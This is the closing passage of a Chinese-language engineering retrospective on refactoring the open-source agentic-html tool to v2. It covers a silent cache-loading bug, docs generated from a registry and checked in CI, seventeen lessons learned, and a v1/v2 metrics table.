不为空**，这个 guard 静默跳过了加载，每个冷进程的 `versions list` 都返回空树（而且不报错，
就是空的）。

> 可复用经验：**"如果缓存为空就加载"这个模式，前提是缓存真的会为空。** 任何在构造期往共享缓存
> 里塞默认值/fixture 的代码，都会让这个前提失效，而失效表现是静默的空结果。要么无条件加载
> （幂等就便宜），要么用一个显式的 `loaded` 标志，不要用"容器为空"来推断"还没加载过"。

---

## 7. 文档也是产物：`check:docs`

v1 的 README 记录了不存在的二进制和不存在的 MCP 入口，**没人发现，因为没有任何东西在检查**。

现在 `scripts/update-docs.ts` 从注册表生成：

- `docs/reference/{commands,mcp-tools,errors}.md`
- `skills/agentic-html/references/commands.md`
- 两个 README 的 `<!-- BEGIN:generated:tools -->` 块

`--check` 只比对不写入，漂移时打印**第一处不一致的行号和两边内容**，并接入 `npm run check`。
截图生成刻意放在 `--screenshots` 后面：CI 机器没有浏览器，**一个需要 Chromium 的文档校验最终
会被人关掉**。

> 可复用经验：**手写的清单一定会漂移，问题只在于多久。** 能生成的就生成，不能生成的就检查。
> 而校验本身必须足够便宜（不依赖浏览器、不依赖网络），否则它会被绕过。

---

## 8. 可复用经验汇总

按重要性排序，都是本次重构真实付出代价换来的。

1. **错误地宣称成功，比失败更贵。** 2.1 的补丁漂移之所以是最严重的缺陷，不是因为它改错了节点，
   而是因为它同时返回了"全部成功"。任何自动化工具的失败路径都必须比成功路径更可信。
2. **优先做能消灭一整类 bug 的改动。** 控制脚本进 iframe 比给 overlay 加 scroll 监听贵，但之后
   "漂移"在这个项目里不再是一个词。补丁两阶段化同理：不修正偏移，而是不用位置。
3. **测试替身会让一整类断言变成不可能。** 全局 `vi.mock('fs/promises')` 让"写了不读"通过了
   326 个测试。凡是引入全局替身，就要同时问"它让什么变得不可验证了"，并为那部分留一条真实路径。
4. **投影 > 副本。** 两份手写实现会互相漂移，加上文档就是三份。能力声明一次、其余全部投影，
   收益不是省代码而是消除漂移的可能性。
5. **对抗性测试要单独做一轮。** "它能工作吗"和"我怎么骗过它"是两种不同的提问，第二种抓到了
   本次全部 7 个隐藏 bug，包括 3 个安全洞。安排一个独立的时间段专门做这件事。
6. **门禁的误杀和漏杀都要专门找。** 只找漏杀会留下一个会误杀的门禁，而会误杀的门禁最终会被
   关掉——然后漏杀一起回来。
7. **"这个分支不适用该检查"≠"这个分支不需要检查"。** 一刀切豁免是安全洞最常见的入口
   （4.2）。正确做法是给这个分支写一条适用的检查。
8. **"可注入 + 有默认值"是陷阱组合。** 默认值让"忘记注入"静默退化而不报错（4.6）。
9. **同一个错误码只能有一个抛出点。** 否则同一个码有多种上下文完整度，调用方无法可靠处理。
10. **错误信息与用户输入矛盾时，问题在解析层。** 4.5 的表现是"缺少一个你已经给了的参数"。
11. **默认值要按"每次调用都付这个代价值不值"来选。** 一个默认开启且泄漏资源的昂贵检查，会以
    "工具卡住"的形式出现，没人会把它和验证功能联系起来（决策 6）。
12. **`slice(-n)` 一定要测 `n = 0`。** `-0 === 0`，所以"最近 0 条"会返回全部（4.4）。
13. **"可见"和"可点"是两个断言。** 被覆盖的按钮 `toBeVisible()` 通过。测遮挡用命中测试。
14. **E2E 里禁止 `if (count > 0) { expect(...) }`。** 元素不存在时静默通过，是假绿。
15. **不变量要写在它被违反时会被读到的地方。** `[data-ah-ctl]` 不进 `<body>` 这条，注释写在
    `control/protocol.ts` 的头部、断言写在 e2e、理由写在文档站——三处都有，因为它一旦被违反，
    症状（选择器解析到错误节点）离原因非常远。
16. **信任边界要跟着 Agent 的位置画。** 参考 RFC 的 Agent 在自己后端里，可以自检；我们的在
    外部进程，所以校验必须在服务端强制。同一个功能，架构位置不同，结论相反。
17. **如实记录没达成的目标。** 打包目标 < 200KB，实际 247.7 kB。写清楚原因（保留 sourcemap）
    比写一个漂亮的数字有用——下一个人才知道这里还有空间以及代价是什么。

---

## 9. 项目数据

| 指标 | v1 | v2 |
|------|-----|-----|
| Agent 接入面 | 2 份手写实现（MCP gateway / CLI gateway） | 1 份注册表 + 3 个投影 |
| 能力数 | 9 | 15（4 个 profile） |
| MCP `tools/list` | **不存在**，无客户端可发现工具 | 真实 `Server` + `StdioServerTransport`，默认 11 / 全部 15 个工具 |
| HTTP 传输面 | 无 | REST + SSE，含 `/v1/tools/openai` |
| 提交闭环 | **404，标注从不落盘** | `POST /api/annotations/submit`，落盘 + 封版 + 回执 |
| 多补丁正确性 | **静默改错节点并报告成功** | 两阶段预解析，冲突显式报错 |
| 结构校验 | 无 | 服务端强制 6 项检查，不通过不落版本 |
| 选择器方言 | 2 套（`:nth-child` / cheerio），零一致性测试 | 1 套（`:nth-of-type`），11 个 fixture 双向一致性测试 |
| 滚动漂移 | 元素 400px / 标记 **0px** | 元素 400px / 标记 400px |
| 视觉验证 | 每次 patch 都跑（~4s）且泄漏浏览器进程 | `verify: true` opt-in，跑完释放 |
| 跨进程持久化 | 写了三个文件，**从不读回** | 读取类命令 + `versions list` + patch 可跨进程（`diff` / `checkout` / `create --parent-id` 仍需同进程） |
| npm 包 | 4.7 MB / 185 文件，**零构建产物** | 247.7 kB / 121 文件，含全部产物 |
| 人对 Agent 的可观测性 | 无 | 活动总线 → WebSocket（人）+ SSE（Agent），带 `seq` 可重放 |
| 文档一致性 | 手写，记录了不存在的命令 | 从注册表生成，`check:docs` 接入 CI |
| 测试项目 | 1（全局 mock fs） | 2（`unit` mock / `fs` 真实文件系统） |

---

*本文对应 RFC `rfcs/v2-agent-decoupling-and-ux.md`。架构说明见文档站
[Architecture](https://xinyuehtx.github.io/agentic-html/guide/architecture)，
开发指南见 `docs/development.md`，Agent 使用说明见 `skills/agentic-html/SKILL.md`
（或 `agentic-html skills get agentic-html --full`）。*

---

> 📦 本文首发于开源项目 [`agentic-html`](https://github.com/xinyuehtx/agentic-html) 仓库 · [查看原文](https://github.com/xinyuehtx/agentic-html/blob/main/blog/v2-agent-decoupling-and-ux.md)
